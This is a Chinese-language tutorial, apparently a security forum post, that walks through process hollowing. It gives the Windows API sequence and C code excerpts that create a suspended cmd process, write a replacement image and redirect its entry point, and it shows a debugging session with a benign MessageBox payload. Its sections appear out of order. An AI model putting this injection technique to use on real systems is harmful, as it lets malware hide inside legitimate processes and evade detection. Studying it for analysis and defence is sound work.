
```
#define IMAGE\_DIRECTORY\_ENTRY\_EXPORT 0 // Export Directory
#define IMAGE\_DIRECTORY\_ENTRY\_IMPORT 1 // Import Directory
#define IMAGE\_DIRECTORY\_ENTRY\_RESOURCE 2 // Resource Directory
#define IMAGE\_DIRECTORY\_ENTRY\_EXCEPTION 3 // Exception Directory
#define IMAGE\_DIRECTORY\_ENTRY\_SECURITY 4 // Security Directory
#define IMAGE\_DIRECTORY\_ENTRY\_BASERELOC 5 // Base Relocation Table
#define IMAGE\_DIRECTORY\_ENTRY\_DEBUG 6 // Debug Directory
// IMAGE\_DIRECTORY\_ENTRY\_COPYRIGHT 7 // (X86 usage)
#define IMAGE\_DIRECTORY\_ENTRY\_ARCHITECTURE 7 // Architecture Specific Data
#define IMAGE\_DIRECTORY\_ENTRY\_GLOBALPTR 8 // RVA of GP
#define IMAGE\_DIRECTORY\_ENTRY\_TLS 9 // TLS Directory
#define IMAGE\_DIRECTORY\_ENTRY\_LOAD\_CONFIG 10 // Load Configuration Directory
#define IMAGE\_DIRECTORY\_ENTRY\_BOUND\_IMPORT 11 // Bound Import Directory in headers
#define IMAGE\_DIRECTORY\_ENTRY\_IAT 12 // Import Address Table
#define IMAGE\_DIRECTORY\_ENTRY\_DELAY\_IMPORT 13 // Delay Load Import Descriptors
#define IMAGE\_DIRECTORY\_ENTRY\_COM\_DESCRIPTOR 14 // COM Runtime descriptor
```

其中`CountRelocationEntries`是一个宏，用于计算重定位的个数。

```
#define CountRelocationEntries(dwBlockSize) \
(dwBlockSize - \
sizeof(BASE\_RELOCATION\_BLOCK)) / \
sizeof(BASE\_RELOCATION\_ENTRY)
```

除此之外`PBASE\_RELOCATION\_ENTRY`结构如下所示，前12位表示偏移量，后4位表示类型。

```
typedef struct BASE\_RELOCATION\_ENTRY {
USHORT Offset : 12;
USHORT Type : 4;
} BASE\_RELOCATION\_ENTRY, \*PBASE\_RELOCATION\_ENTRY;
```

接下来的部分会涉及到线程执行劫持，利用`OpenThread`打开目标线程，在获取目标线程的句柄后，恶意软件通过调用`SuspendThread`来将线程置于挂起模式。调用`VirtualAllocEx`和`WriteProcessMemory`来分配内存并执行代码注入的操作。然后调用`GetThreadContext`和`GetThreadContext`获取并设置线程的上下文，以将`EIP`寄存器设置到要执行恶意代码的地址，达到重启线程的作用。。

```
涉及的相关API函数使用顺序
OpenThread
SuspendThread
VirtualAllocEx
WriteProcessMemory
GetThreadContext
SetThreadContext
ResumeThread
```

注意的是`pContext->Eax = dwEntrypoint;`利用某个寄存器来完成入口点的赋值，利用`SetThreadContext`完成上下文设置，最后通过`ResumeThread`执行，代码如下所示。

```
printf("total write %d relocationtable\r\n",num);
DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
printf("EntryPoint=0x%p\r\n", dwEntrypoint);
#ifdef WRITE\_BP
printf("Writing breakpoint\r\n");
DWORD dwBreakpoint = 0xCC;
if (!WriteProcessMemory
(
pProcessInfo->hProcess,
(PVOID)dwEntrypoint,
&dwBreakpoint,
4,
0
))
{
printf("Error writing breakpoint\r\n");
return;
}
#endif
pContext = new CONTEXT();
pContext->ContextFlags = CONTEXT\_INTEGER;
printf("Getting thread context\r\n");
if (!GetThreadContext(pProcessInfo->hThread, pContext))
{
printf("Error getting context\r\n");
return;
}
pContext->Eax = dwEntrypoint;
printf("Setting thread context\r\n");
if (!SetThreadContext(pProcessInfo->hThread, pContext))
{
printf("Error setting context\r\n");
return;
}
printf("Resuming thread\r\n");
if (!ResumeThread(pProcessInfo->hThread))
{
printf("Error resuming thread\r\n");
return;
}
printf("Process hollowing complete\r\n");
}
```

自此，整个代码流程就讲解完成如有什么疑问，可自行查询相关资料或者留言告知我。

### HelloWorld演示

接下来进行调试演示，通过调试发现Creating process的进程是cmd，并且为Suspended，符合之前的描述过程。

![1609487103104](upload/attach/202101/830514\_VNHBBXWQ4G6BRKW.png)

获取到cmd相关结构信息。

![1609487237000](upload/attach/202101/830514\_BUW8TEHWTBZNE54.png)

获取重定位的目标差。

![1609487875703](upload/attach/202101/830514\_D2QV57V3GPTVESA.png)

由于HelloWorld.exe本身没有重定位表，所以调试的时候一直没有进入相关函数。

### DLL调试

这里自己创建一个dll来替代HelloWorld。

![1609502777237](upload/attach/202101/830514\_2PQW5PW6R9YGRSW.png)

通过调试发现`dwEntryCount`值为136，目前还没有搞明白是什么意思。

![1609503039805](upload/attach/202101/830514\_TVRFWHEF5QDJUP9.png)

最后通过打印，发现一共找到了148个重定位函数，有些不可思议。

![1609502102873](upload/attach/202101/830514\_EUR7MYQACJSAJWB.png)

借助studype来看一下重定位表的情况，0x88+0xE=0x96=226，比输出的148大，通过内容发现有些是00，所以我选择相信有148个需要重定位的函数。

![1609502260984](upload/attach/202101/830514\_U6USRYG2E7ZZ6RH.png)

新的程序入口点为0xABB829A即将赋值给eax+0xb0这里。

![1609502376011](upload/attach/202101/830514\_FNG4RMQNAFVWEJ9.png)

通过另一个调试器附件进程，如果附加失败则在CreateProcess之后就附加即可。

![1609502565734](upload/attach/202101/830514\_CP8X9W2FA2W43A5.png)

成功弹出MessageBox，整体调试完毕。

![1609503810813](upload/attach/202101/830514\_AKQ238PAKYWXNCH.png)

**2021年第一篇技术分析文章，有不足之处还请大家多多包涵。**

## 进程替换技术(process hollowing)

通过对API的调用，实现文件不落地的一种技术。需要编译选项`/DYNAMICBASE` or `/FIXED` 其中一个为NO 目的是取消生成重定位表，这里已`/DYNAMICBASE`为例子。

![1609481206895](https://bbs.kanxue.com/upload/attach/202101/830514_SXNHYS536YMEXG6.png)

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15 | `涉及的API使用情况和相关重定位的计算方式。`  `CreateProcess` `/``/``以CREATE_SUSPENDED挂起状态创建进程`  `ZwUnmapviewOfSection` `/``/``释放目标进程内存，解除内存映射`  `VirtualAllocEx` `/``/``为恶意代码分配新空间`  `WriteProcessMenory` `/``/``写入数据（文件头）`  `for``(i``=``0``;i<NumberOfSection;i``+``+``)`  `WriteProcessMenory` `/``/``写入节区数据`  `SetThreadContext` `/``/``设置线程执行位置`  `ResumeThread` `/``/``重新启动主线程`    `重定位表存储表达式``=``2``*``n``+``4``+``4` `字节`  `第一个``4``为VirtualAddress`  `第二个``4``为SizeofBlock`  `n为重定位表个数`  `重定位表主要修改FF15``/``FF25类跳转和涉及取内存地址的区域` |

### 源码讲解

测试代码来源 [github](https://bbs.kanxue.com/elink@b43K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0x3r3^5H3M7r3R3I4i4K6u0r3f1s2u0G2j5$3g2K6M7#2)9J5k6p5S2G2L8r3I4G2N6$3W2F1k6H3`.`.)，HelloWorld和ProcessHollowing两个进程。

ProcessHollowing通过main函数代码可以发现CreateHollowedProcess函数是整个进程替换的核心，对其进行重点学习。

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27 | `int` `_tmain(``int` `argc, _TCHAR``*` `argv[])`  `{`  `char``*` `pPath` `=` `new char[MAX_PATH];`  `GetModuleFileNameA(``0``, pPath, MAX_PATH);`  `pPath[strrchr(pPath,` `'\\'``)` `-` `pPath` `+` `1``]` `=` `0``;`  `strcat(pPath,` `"helloworld.exe"``);`    `CreateHollowedProcess`  `(`  `"cmd"``,`  `pPath`  `);`  `system(``"pause"``);`  `VirtualFreeEx(`  `pProcessInfo``-``>hProcess,`  `pPEB``-``>ImageBaseAddress,`  `pSourceHeaders``-``>OptionalHeader.SizeOfImage,`  `MEM_DECOMMIT);`  `TerminateProcess(pProcessInfo``-``>hProcess,` `0``);`  `delete pStartupInfo;`  `delete pProcessInfo;`  `delete pBuffer;`  `delete pContext;`  `delete []pPath;`    `return` `0``;`  `}` |

由于要进行进程替换，所以得先启动一个进程然后将这个进程""挖空"，并填入需要写入的另外一个进程的内容，最后跳转到执行点执行，就完成了整个进程替换的过程。

通过前半部分的代码可以得知目前正在获取的cmd的进程信息，并且CreateProcessA的第六个参数决定了该进程将以挂起的形式创建。

通过PROCESS\_INFORMATION结构中的hProcess来获取进程句柄，通过PEB结构获取进程的ImageBaseAddress结构。

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28 | `pStartupInfo` `=` `new STARTUPINFOA();`  `pProcessInfo` `=` `new PROCESS_INFORMATION();`  `CreateProcessA`  `(`  `0``,`  `pDestCmdLine,` `/``/``cmd`  `0``,`  `0``,`  `0``,`  `CREATE_SUSPENDED,`  `0``,`  `0``,`  `pStartupInfo,`  `pProcessInfo`  `);`    `if` `(!pProcessInfo``-``>hProcess)`  `{`  `printf(``"Error creating process\r\n"``);`    `return``;`  `}`    `pPEB` `=` `ReadRemotePEB(pProcessInfo``-``>hProcess);`    `PLOADED_IMAGE pImage` `=` `ReadRemoteImage(pProcessInfo``-``>hProcess, pPEB``-``>ImageBaseAddress);`    `printf(``"Opening source image\r\n"``);` |

PEB结构如下所示，由于PEB结构较大只留下部分结构信息。

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16 | `typedef struct _PEB {`  `BOOLEAN                 InheritedAddressSpace;`  `BOOLEAN                 ReadImageFileExecOptions;`  `BOOLEAN                 BeingDebugged;`  `BOOLEAN                 Spare;`  `HANDLE                  Mutant;`  `PVOID                   ImageBaseAddress;`  `PPEB_LDR_DATA           LoaderData;`  `PRTL_USER_PROCESS_PARAMETERS ProcessParameters;`  `PVOID                   SubSystemData;`  `PVOID                   ProcessHeap;`  `PVOID                   FastPebLock;`  `PPEBLOCKROUTINE         FastPebLockRoutine;`  `PPEBLOCKROUTINE         FastPebUnlockRoutine;`  `······`  `}` |

接下来使用CreateFileA的第二个参数GENERIC\_READ，来判断获取HelloWorld文件是否存在。如果存在则获取文件大小并分配内存将其加载到内存中，pBuffer就是这段内存的头指针。

|  |  |

| --- | --- |
